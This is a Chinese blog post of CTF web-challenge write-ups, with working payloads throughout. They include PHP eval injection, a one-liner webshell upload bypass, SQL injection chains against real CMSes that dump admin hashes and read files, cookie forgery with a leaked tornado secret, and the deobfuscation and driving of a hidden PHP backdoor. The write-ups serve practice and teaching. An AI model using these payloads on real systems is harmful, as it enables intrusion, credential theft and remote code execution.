---
title: i 春秋 Web 练习记录
date: 2019-08-24 20:42:38
tags:
  - PHP
  - Hash
  - 古典密码与编码
  - SQLi
  - 文件上传
  - 反序列化
categories:
  - Web 安全
---

i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。

<!--more-->

## 爆破 - 1
```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
if(!preg_match('/^\w*$/',$a)){
  die('ERROR');
}
eval("var_dump($$a);");
show_source(__FILE__);
?>
```
要求参数 `hello` 为纯字母，又看到 `eval(var_dump($$a));` 语句，可以想到使用 `$GLOBALS` 打印出所有变量，payload：
```
?hello=GLOBALS
```

等等，好像没爆破啊？感觉是非预期解。

## 爆破 - 2
```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
eval("var_dump($a);");
show_source(__FILE__);
```
提示 `flag` 不在变量中，那么只能直接读 `flag.php` 文件了，payload：
```
?hello=file('flag.php')
```
另一种 payload 则类似注入：
```
?hello=);show_source(‘flag.php’);//
```

## 爆破 - 3
```php
<?php
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```
首先如果 `cookie` 中不设置 `nums` 会给 `whoami` 设置默认值 `ea`，且 `session` 只能维持 120ms，所以应该需要用脚本跑。

接下来，如果 `whoami` 和传入的 `value` 相同，且 `value` 的 MD5 值子串为 0，那么 `nums` 就加 1，`whoami` 更新为两个新的随机字母。后一个条件可以很容易地用数组绕过。

我们尝试传入 `value=ea`，果然显示了 `whoami` 的下一个值。脚本：

```py
import requests

url = 'http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea'

ss = requests.session()
r = ss.get(url)

for i in range(10):
  r = ss.get(url[:-2] + r.text[0:2])
  print(r.text[:50])
```
需要注意的是所有请求都要维持在同一 session 下。

这题终于有点爆破的意思了。

## Upload
尝试上传 php 一句话木马，发现过滤了 `<?` 和 `php`，对前者利用 `<script>` 绕过，后者则大写绕过。payload：
```php
<script language="PHP">
  eval($_POST['ant']);
</script>
```
上传 getshell，在上级目录得到 `flag.php`。

## Code
题目链接中含有 `?jpg=hei.jpg`，猜测可能可以通过这个读文件，尝试 `?jpg=index.php`，F12 得到 base64 后的源代码，解码：
```php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=hei.jpg');
$file = $_GET['jpg'];
echo '<title>file:'.$file.'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";

/*
 * Can you find the flag file?
 *
 */

?>
```
注意这里会对 `file` 进行过滤，将非数字 / 字母删除，并将 `config` 换成 `_`，但是我们并不知道我们要读的文件是什么。

这时可以注意到注释：`Created by PhpStorm`，猜想是 `.idea` 泄漏，因此访问 `/.idea/workspace.xml`，可以发现文件 `fl3g_ichuqiu.php`。由于 `_` 不是数字或字母，我们应用上述规则访问 `fl3gconfigichuqiu.php`：
```
index.php?jpg=fl3gconfigichuqiu.php
```
解码得到：


```php
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');
function random($length, $chars ='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
        $tmp .= chr(ord($txt[$i])+10);
    }
    $txt = $tmp;
    $rnd=random(4);
    $key=md5($rnd.$key);
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];
    }
    return base64_encode($rnd.$ttmp);
}
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);
    $txt = substr($txt,4);
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $tmp .= $txt[$i]^$key[++$s];
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;
}
$username = decrypt($_COOKIE['user'],$key);
if ($username =='system'){
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));
    echo "╮(╯▽╰)╭";
}
?>
```


先不管加解密过程，只看最后几行主程序：将 cookie 中的 `user` 通过 `key` 解密，如果得到明文为 `system` 则成功，否则将返回 `guest` 经过 `key` 加密后的密文。显然后者是我们获得 `key` 值的关键。

然后关注加密过程：先将每个字符的 ASCII 码加 10 得到新的 `txt`，随后随机生成 4 个字符 `rnd` 与 `key` 拼接后进行 MD5，得到新 `key`。将新 `txt` 与新 `key` 按字符异或得到 `ttmp`，若 `txt` 的长度超出 `key` 则在 `key` 后继续拼接 `key`。最后，返回 `rnd` 拼接上 `ttmp` 后的 base64 值就是密文。

附 python2 脚本（python3 中的 byte 和 str 转换可能导致错误结果）：


```py
import requests
import base64

url = 'http://036fb8c596914fd18ad96399893a61dd9da80da355bf450e.changame.ichunqiu.com/fl3g_ichuqiu.php'
cookie = requests.get(url).cookies['user']

txt = base64.b64decode(cookie)
rnd = txt[:4]
ttmp = txt[4:]

key = list('aaaaaa')
guest = list('guest')
system = list('system')

for i in range(5):
  guest[i] = chr(ord(guest[i]) + 10)
for i in range(5):
  key[i] = chr(ord(ttmp[i]) ^ ord(guest[i]))

for i in range(6):
  system[i] = chr(ord(system[i]) + 10)

cookies = []
for c in '1234567890abcdef': # md5
  key[5] = c
  ttnew = ''
  for i in range(6):
    ttnew += chr(ord(key[i]) ^ ord(system[i]))
  cookies.append(base64.b64encode(rnd + ttnew))

for i in cookies:
  cookie = {'user': i}
  r = requests.get(url=url, cookies=cookie)
  print r.text
```


这题才应该叫爆破。。最后其实是爆破 `key` 的第 6 位才出的结果。

## YeserCMS
进入 CMS 乱点一波发现是从 cmseasy，网上查到了 [无限制报错注入漏洞](https://shuimugan.com/bug/view?bug_no=137013)。

仿照漏洞 payload 来进行注入，POST 数据：
```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(concat(database())) ),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
```
得到数据库名 `Yeser`。

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
```
这里由于长度无法显示所有表，可以修改 `1,32` 的 `1` 来查看后续表，我们需要的是 `yesercms_user`。

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name='yesercms_user'),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
```
这里也会有许多列，我们需要的是 `username` 和 `password`。

```
xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(updatexml(1,concat(0x7e,mid((select concat(username,password) from yesercms_user),1,32),0x7e),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>
```
这里的 password 显示不全，同样修改 `1,32` 的 `1` 来查看完整的 MD5 值：`ff512d4240cbbdeafada404677ccbe61`。解密得到密码：`Yeser231`。登录并进入后台管理页面。

管理页面内容很多，但是都没有什么注入点。最终，在 ` 模板 `->` 当前模板编辑 ` 中发现，编辑模板时会先读取相应的文件。因此我们任选一个文件，点击 ` 编辑 ` 并抓包，将唯一的参数 `id` 修改为想读取的文件。经测试，这里应该是 `../../flag.php`。

## XSS 平台
尝试注入无果，构造非法参数 `pass=bbb&email[]=aaa` 得到报错信息，其中有一行：
```
File "/var/www/html/rtiny/login.py", line 20, in post
```
结合题目名，得知这是使用 RTiny 编写的 XSS 平台，项目地址在 [这里](https://github.com/r0ker/Rtiny-xss)。其中，`rtiny/lock.py` 存在 SQL 注入漏洞，`post` 方法中对 `username` 没有任何过滤：

```py
#!/usr/bin/env python
# -*- coding:utf-8 -*-

__author__ = 'r0ker'
import tornado.web
from function import md5
import db
from config import URL


class LockHandler(tornado.web.RequestHandler):
	def get(self):
		self.set_secure_cookie("lock",'1')
		self.render("lock.html")

	def post(self):
		username = self.get_secure_cookie("username") or ''
		passwd = md5(self.get_argument('password',''))
		row = db.ct("manager", "*", "username='"+ username +"'and password='"+ passwd +"'")
		if row:
			self.set_secure_cookie("lock", "0")
			self.redirect("http://" + URL)
		else:
			self.redirect("http://" + URL + "/lock")
```
而 `set_secure_cookie` 方法来自 `tornado`，该方法使用一个 `cookie_secret` 来加密 `cookie`。我们可以在 `index.py` 中发现这个 `cookie_secret`：
```py
settings = {
	"static_path": os.path.join(os.path.dirname(__file__), "themes/static"),
	"template_path": os.path.join(os.path.dirname(__file__), "themes"),
	"cookie_secret": "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
	"login_url": "/login",
}
```
所以，我们在注入的时候，只需要将 payload 用 `cookie_secret` 加密即可。借助 `tornado` 写个脚本：


```py
import tornado.web
import tornado.ioloop

settings = {
  'cookie_secret': 'M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc='
}

class MainHandler(tornado.web.RequestHandler):
  def get(self):
    self.write('aaa')
    # self.set_secure_cookie('username', "' and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#")
    # self.set_secure_cookie('username', "' and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='manager'),0x7e),1)#")
    # self.set_secure_cookie('username', "' and updatexml(1,concat(0x7e, (select group_concat(username,'||',password,'||',email) from manager),0x7e),1)#")
    self.set_secure_cookie('username', "' and updatexml(1,concat(0x7e, mid((select group_concat(username,'||',password,'||',email) from manager),30,40),0x7e),1)#")
    self.write(self.get_secure_cookie('username'))

def makeapp():
  return tornado.web.Application([
    (r'/index', MainHandler),
  ], **settings)

app = makeapp()
app.listen(8089)
tornado.ioloop.IOLoop.instance().start()
```


浏览器访问本机 8089 端口，在返回头 `Set-Cookie` 中得到加密后的注入语句，带着这个 cookie 访问网页的 `/lock`（而不是 `/login`）。在爆用户名、密码和邮箱时，显示长度有限制，因此需要分两次用 `mid` 截取，最终得到用户名、密码和邮箱为：
```
ichuqiu||318a61264482e503090facfc4337207f||545
```
密码经过 MD5 解密得到：`Myxss623`。登录在后台发现 `f13g_ls_here.txt` 文件，继续通过注入读取该文件。将代码中 `set_secure_cookie` 的第二个参数改为：
```
"' and updatexml(1,concat(0x7e, (select load_file('/var/www/html/fl3g_ls_here.txt')),0x7e),1)#"
```
然后故技重施，由于长度限制只得到一部分 flag，再修改 payload：
```
"' and updatexml(1,concat(0x7e, mid((select load_file('/var/www/html/f13g_ls_here.txt')),30,40),0x7e),1)#"
```
即可得到第二部分。

## 再见 CMS
根据登录页面页脚可以判断出该 CMS 为齐博 CMS。[漏洞参考](https://blog.csdn.net/qq_33020901/article/details/52593063)，很巧妙地利用了转义进行 SQL 注入。

根据参考的文章，先注册一个用户，然后去会员中心修改个人信息，可以看到表单中每一项对应什么参数。然后构造 payload：
```
/member/userinfo.php?job=edit&step=2
```
POST 数据：
```
truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select database()) where uid=3#
```
首先 `uid` 对应自己账户的 `uid`，在个人信息处可以在 url 中看到。注入的具体原理参考 “漏洞参考” 文章，注入点是参数 `provinceid`，注意不是 `address`。

这样可以在个人信息页面的 “联系地址” 一栏得到数据库名 `blog`。接下来爆表名：
```
truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3#
```
我们关心的是表 `admin`。爆列名，注意单双引号会被转义所以不能使用，可以用十六进制绕过：
```
truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3#
```
爆用户名和密码：
```
truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select group_concat(username,0x7e,password) from admin) where uid=3#
```
得到用户名 `admin`，密码 MD5 `2638127c92b79ee7901195382dc08068`，普通 MD5 网站解不出来，在 `https://hashkiller.co.uk/Cracker` 和 `http://www.chamd5.org/` 上破解出来是 `4b10b488e4c8`，但是用这个密码登录不了，可能方向错了吧。

无奈只能扫下目录发现 `flag.php`，然后利用 SQL 读文件：
```
truename=xxxx%0000&Limitword[000]=&email=123456@qq.com&provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3#
```

发现联系地址这次变成了空白，F12 得到 `flag.php` 源码从而得到 flag。

## SQL
过滤了很多关键字，绕过技巧是用 `<>` 来分割：
```sql
id=1 o<>rder by 1
```
发现 `by 4` 的时候无回显但 `by 3` 的时候有，说明共 3 列。
```sql
id=1 union se<>lect 1,2,3
```
得到回显 `2`。接下来正常注入：
```sql
id=1 union se<>lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
-- info, users
id=1 union se<>lect 1,group_concat(column_name),3 from information_schema.columns where table_name='info'
-- id,title,flAg_T5ZNdrm
id=1 union se<>lect 1,flAg_T5ZNdrm,3 from info
-- flag{...}
```

## SQLi
F12 发现 `login.php?id=1`，但是这里好像注入不了。

回到前页，发现页面是由 `index.php` 302 跳转来的，因此检查一下对于 `index.php` 的请求的返回头，发现了特殊字段 `page`，得到真正的登陆页面 `l0gin.php?id=1`。

这个 `id` 可以注入，但是存在逗号截断，因此需要在没有逗号的情况下注入，这里很容易想到 `join`。先 `order by` 注入，得到列数为 2。
```
id=1' order by 3%23
```
尝试一下 `join`:
```
id=1'union select * from (select 1)a join (select 2)b%23
```
发现还是正常返回 `1,flag`，因为网页上限制了只能显示一条记录，而 `id=1` 的查询是成功的，因此后面我们 `union` 的结果没有回显出来。因此只需要让 `id=3` 使得查询不到 `username` 即可。

最后正常注入：
```
id=3'union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b%23

id=3'union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name='users')b%23

id=3'union select * from (select 1)a join (select flag_9c861b688330 from users)b%23
```

## 123
F12 得到 `user.php` 和用户默认密码，下载 `user.php.bak`，打开得到一堆用户名。Intruder 用 `BatteringRam` 模式爆破用户名密码，登陆后 F12 得到：
```html
<!-- 存在漏洞需要去掉  -->
<!-- <form action=""method="POST"enctype="multipart/form-data">
	<input type="file"name="file"/>
	<input type="submit"name="submit"value=" 上传 "/>
</form> -->
```
这里猜测是文件上传漏洞。恢复前端代码后随便选个文件上传，发现只能传图片文件，因此修改 `Content-Type` 和文件内容。`Content-Type` 设置为 `image/png`，文件内容中写入 PNG 文件头 `PNG`。然后将文件名改为 `1.png.php`，但是提示 ` 文件名不能包含 php`。

因此尝试 `1.png.pht` 绕过，得到页面 `view.php`。只有一个提示 `file?`，尝试传入 GET 参数 `file=flag`，得到提示 `filter 'flag'`，于是双写绕过。

## Test
海洋 CMS 很老的漏洞，[漏洞详情](http://0day5.com/archives/4180/)。

直接蚁剑连接 `/search.php?searchtype=5&tid=&area=eval($_POST[1])` 来 getshell。但是没有找到 flag。

到 `/var/www/html/data/common.inc.php` 找到数据库配置：
```php
<?php
// 数据库连接信息
$cfg_dbhost = '127.0.0.1';
$cfg_dbname = 'seacms';
$cfg_dbuser = 'sea_user';
$cfg_dbpwd = '46e06533407e';
$cfg_dbprefix = 'sea_';
$cfg_db_language = 'utf8';
?>
```
在蚁剑中选择 ` 数据操作 `，然后输入上面的配置信息，可以在 `seacms` 数据库的 `flag_140ad2e0d8cb` 表中执行 SQL 语句得到 flag。

## Login
F12 中提示账户密码都为 `test1`，登录后在响应头中发现 `show` 字段，把 0 在请求头改成 1 试试，发现注释中返回了源码。


```php
<?php
	include 'common.php';
	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
	class db
	{
		public $where;
		function __wakeup()
		{
			if(!empty($this->where))
			{
				$this->select($this->where);
			}
		}

		function select($where)
		{
			$sql = mysql_query('select * from user where'.$where);
			return @mysql_fetch_array($sql);
		}
	}

	if(isset($requset['token']))
	{
		$login = unserialize(gzuncompress(base64_decode($requset['token'])));
		$db = new db();
		$row = $db->select('user=\''.mysql_real_escape_string($login['user']).'\'');
		if($login['user'] ==='ichunqiu')
		{
			echo $flag;
		}else if($row['pass'] !== $login['pass']){
			echo 'unserialize injection!!';
		}else{
			echo "(╯‵□′)╯︵┴─┴ ";
		}
	}else{
		header('Location: index.php?error=1');
	}

?>
```


这里需要以 `ichunqiu` 登录，关键就在于那个反序列化的过程。而且，`array_merge` 合并时，遇到相同的键取最后的那个值。

写个脚本生成需要的 `token`，然后放在 cookie 里发送就好了。
```php
<?php
  $a = array('user' => 'ichunqiu');
  echo base64_encode(gzcompress(serialize($a)));
?>
```

## Backdoor
扫目录发现 `.git` 泄露。上 GitHack 把 `.git` 下载下来，然后发现需要回退。

值得记录的是 GitHack 好像没能把 `.git` 下下来，只能下载所有文件，因此我使用了 `dvcs ripper` 这个工具：
```bash
./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2.
changame.ichunqiu.com/Challenges/.git/
```

访问 `/Challenges/.git/logs/HEAD` 可以查看提交记录，或者也可以 `git log` 查看。随后回退到之前的版本：
```bash
git reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88
cat flag.php
```
这时可以看到，`flag.php` 内容变为：
```php
<?php
echo "flag{true_flag_is_in_the_b4ckdo0r.php}";
?>
```
那么我们继续访问 `b4ckdo0r.php`，提示要找出其源码。这种一般都存在备份文件里，例如 `vim` 中的 `.swo` 和 `.swp`，逐一尝试得备份文件 `.b4ckdo0r.php.swp`，用 `vim -r` 恢复：
```php
<?php
echo "can you find the source code of me?";
/**
 * Signature For Report
 */$h='_)m/","/-/)m"),)marray()m"/","+")m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/*
 */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print("<)m$k>$d<)m/)m$k>)m");@sessio)mn_d)mestroy();}}}}';/*
 */$N='mR;$rr)m=@$r[)m"HTT)mP_RE)mFERER"];$ra)m=)m@$r["HTTP_AC)mC)mEPT_LANG)mUAGE)m")m];if($rr)m&&$ra){)m$u=parse_u)mrl($rr);p';/*
 */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array("/';/*
 */$f='$i<$)ml;)m){)mfo)mr($j)m=0;($j<$c&&$i<$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/*
 */$O='[$i]="";$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/*
 */$w=')m));)m$p="";fo)mr($z=1;)m$z<c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/*
 */$P='trt)molower";$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3';/*
 */$i=')marse_)mstr)m($u["q)muery"],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m"/([\\w)m])m)[\\w-)m]+(?:;q=0.)';/*
 */$x='m([\\d)m]))?,?/",)m$ra,$m))m;if($q)m&&$)mm))m)m{@session_start();$)ms=&$_S)mESSI)m)mON;$)mss="sub)mstr";strtolower="s)m';/*
 */$y=str_replace('b','','crbebbabte_funcbbtion');/*
 */$c='$kh="4f7)m)mf";$kf="2)m)m8d7";funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o="";for()m$i=0;';/*
 */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/*
 */$v=$y('',$L);$v();/*
 */
?>
```
这里的代码经过了混淆，我们在代码末尾加上一段代码来进行分析：
```php
echo var_dump($L);
echo $y;
echo $v;
```
得到原本的核心代码 (`$L`)：


```php
<?php
$kh="4f7f";
$kf="28d7";
function x($t,$k)
{
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0; $i<$l;)
    {
        for($j=0; ($j<$c&&$i<$l); $j++,$i++)
        {
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra)
{
    $u=parse_url($rr);
    parse_str($u["query"],$q);
    $q=array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
    if($q&&$m)
    {
        @session_start();
        $s=&$_SESSION;
        $i=$m[1][0].$m[1][1];
        $h=strtolower(substr(md5($i.$kh),0,3));
        $f=strtolower(substr(md5($i.$kf),0,3));
        $p="";
        for($z=1; $z<count($m[1]); $z++)$p.=$q[$m[2][$z]];
        if(strpos($p,$h)===0)
        {
            $s[$i]="";
            $p=substr($p,3);
        }
        if(array_key_exists($i,$s))
        {
            $s[$i].=$p;
            $e=strpos($s[$i],$f);
            if($e)
            {
                $k=$kh.$kf;
                ob_start();
                //！
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),substr($s[$i],0,$e))),$k)));
                $o=ob_get_contents();
                ob_end_clean();
                $d=base64_encode(x(gzcompress($o),$k));
                print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
```


代码的重点在于 `Accept-Language`，`Referer` 和感叹号所在的行，因为可以用 `eval` 执行代码。

首先 `x` 函数显然是循环异或。随后仔细阅读 `preg_match_all` 的正则表达式，发现它将 `Accept-Language` 分成了 3 部分，`m[0]` 存每种语言的完整字符串，`m[1]` 存首字母，`m[2]` 存语言权重小数点后的数字。

> Accept-Language 格式：` 语言;q=权重 `，例如 `en-US;q=0.5`

而 `$i` 取的是 `$m[1][0].$m[1][1]`，也就是前两种语言的首字母。`$h` 和 `$f` 不难计算，我们假设输入的语言是 `zh-CN,zh`，那么 `$i` 就是 `zz`，计算得到 `$h` 为 `675`，`$f` 为 `a3e`。

不过下面的 `for` 循环有点绕：
```php
for($z=1; $z<count($m[1]); $z++)
  $p.=$q[$m[2][$z]];
```
`$z` 指当前是第几种语言，`$m[2][$z]` 就是该语言权重的小数点后第一位，以这个值为索引取得 `Referer` 的 url 中 query string 里对应索引的那个参数值拼接到 `$p` 上。

下面的 `if` 判断 `$p` 是不是以 `$h` 开头 `$f` 结尾，如果是则进入下面的 `eval` 函数，我们才能实现命令注入。`eval` 函数内是一个简单的写逆向函数的过程。

脚本：
```php
<?php
// 照搬
function x($t,$k)
{
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0; $i<$l;)
    {
        for($j=0; ($j<$c&&$i<$l); $j++,$i++)
        {
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

function inject($cmd) {
    $payload = base64_encode(x(gzcompress($cmd), "4f7f28d7"));
    return "675".$payload."a3e";
}

echo inject('system("ls");');
?>
```
将得到的字符串放在 `Referer` 的第一个参数里，设置请求头：
```
Accept-Language: zh-CN,zh;q=0.0
Referer: http://12.12.12.12/index.php?a=675TPocyB4WLfrhNv1PZOrQMTREimJna3e
```
得到经过编码的返回值：
```
TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT
```
再写脚本解码：
```php
<?php
// 照搬
function x($t,$k)
{
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0; $i<$l;)
    {
        for($j=0; ($j<$c&&$i<$l); $j++,$i++)
        {
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

function dec($out) {
    return gzuncompress(x(base64_decode($out), '4f7f28d7'));
}

echo dec('TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT');
?>
```
得到解码后的返回值：
```
b4ckdo0r.php flag.php index.php robots.txt this_i5_flag.php
```
然后执行命令 `cat this_i5_flag.php`，和上面一样的方法编码后发送得到编码后的 flag，再用同样方法解码即可。最后 flag 在页面注释中。

## GetFlag
熟悉的爆破 md5 套路：
```py
import hashlib, sys

for i in range(10**5, 10**8):
    val = hashlib.md5(str(i)).hexdigest()
    if val[:6] == sys.argv[1]:
        print(i)
        break
```
用户名可以直接注入，密码任意。登录后可以看到三个文件。提示说 flag 在 web 根目录。注意到文件的下载 url 为：
```
/Challenges/file/download.php?f=a.php
```
可以尝试下载 `flag.php`，但是显示 `flag{wow!!!but not true}`。猜想这里可能不能使用相对路径，换成绝对路径：
```
/Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
```
得到源码：
```php
<?php
$f = $_POST['flag'];
$f = str_replace(array('`','$','*','#',':','\\','"',"'",'(',')','.','>'),'', $f);
if((strlen($f) > 13) || (false !== stripos($f,'return')))
{
		die('wowwwwwwwwwwwwwwwwwwwwwwwww');
}
try
{
		 eval("\$spaceone = $f");
}
catch (Exception $e)
{
		return false;
}
if ($spaceone ==='flag'){
	echo file_get_contents("helloctf.php");
}

?>
```
。。。看似过滤一大堆，实际上直接 POST 提交 `flag=flag;` 就完了，需要注意的就是最后的分号。

## Not Found
首页直接跳转到不存在的 `404.php`，在响应头中发现 `X-Method: haha` 字段。一次尝试 HTTP 方法，当使用 `OPTIONS` 时，发现响应头中多出了 `Location: ?f=1.php` 字段。对这个 url 也进行 `OPTIONS` 请求，得到一段源码：
```php
<?php
	$msg = "not here";
	$msg .= PHP_EOL;
	$msg .="plz trying";
  echo $msg;
```
直接访问 `1.php` 发现这就是 `1.php` 的源码。猜测这个 `f` 参数的功能就是文件读取，尝试 `index.php` 发现不允许。最后发现 `.htaccess` 却可以读：
```
RewriteEngine On
RewriteBase /
RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L]
```
因此我们访问这个 html 得到提示，修改 XFF 头，但是无效。因此我们换而修改 `client-ip` 头为 `127.0.0.1` 得到 flag。

## Vld
F12 得到提示 `index.php.txt`，访问得到了一个看不太懂的文件，似乎是 php 的 opcode。耐心分析还是不难理解的，需要三个 GET 参数 `flag1, flag2, flag3`，分别等于 `fvhjjihfcv, gfuyiyhioyf, yugoiiyhi`。访问新 url 可以下载到源码。

观察源码发现关键的地方在于：
```php
/* dbmysql.class.php */
public function my_md5($string){
    return md5(substr(md5($string),5,24));
}

public function safe_data($value){
    if(MAGIC_QUOTES_GPC){
        stripcslashes($value);
    }
    return addslashes($value);
}

/* login.php */
$username = $db->safe_data($_POST['username']);
$password = $db->my_md5($_POST['password']);
$number = is_numeric($_POST['number']) ? $_POST['number'] : 1;
$username = trim(str_replace($number,'', $username));
$sql = "select * from"."`".table_name."`"."where username="."'"."$username"."'";
```
这里可以看到 `username` 会先被 `addslashes`，然后其中和 `number` 相同的部分会被去掉。这样我们就能让 `'` 逃过转义，当我们提交 `username=%00'` 时，会被 `addslashes` 转义为 `\0\'`，如果 `number=0`，则其中的 0 会被替换掉变成 `\\'`，此时第二个 `\` 被转义，原 SQL 语句变为 `where username='\\'`，成功闭合。

然后就是报错注入，注意语句中不能再出现 `0` 了：
```
number=0&username=%00'or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema=database()),hex(126)),1)#&password=ccc&submit=

number=0&username=%00'or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#&password=ccc&submit=

number=0&username=%00'or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#&password=ccc&submit=
```

## EXEC
F12 在 html 的 head 标签中发现 `editor="vim"`，显然能下载 `.index.php.swp`：
```php
<?php
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {
                $digit = ord($number{$i});
                if (($digit>= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
        setcookie('auth','tcp tunnel is forbidden!');
        if(isset($_POST['cmd'])){
                $command=$_POST[cmd];
                $result=exec($command);
                //echo $result;
        }
}else{
        die('no sign');
}
?>
```
